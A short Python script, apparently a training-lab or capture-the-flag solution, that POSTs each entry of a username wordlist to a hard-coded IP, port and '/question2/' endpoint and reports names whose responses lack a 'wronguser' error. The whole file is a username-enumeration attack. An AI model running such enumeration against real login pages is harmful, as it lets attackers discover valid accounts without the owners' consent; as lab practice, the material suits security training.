

import requests


fd = open('top-usernames-shortlist.txt','r')
wordlist = fd.read()
#print(wordlist)
fd.close()


usernames = list(wordlist.split('\n'))
#print(usernames)

url = "http://139.59.183.98:31177/question2/"


#Username=§admin§&wronguser=§admin§&count=1&Password=admin

for i in usernames:

	data = {
		"Username":i,
		"wronguser":i,
		"count":"1",
		"Password":"admin"
	}

	r = requests.post(url,data=data)
	if "wronguser" not in r.text:
		print("User Found {}".format(i))
 
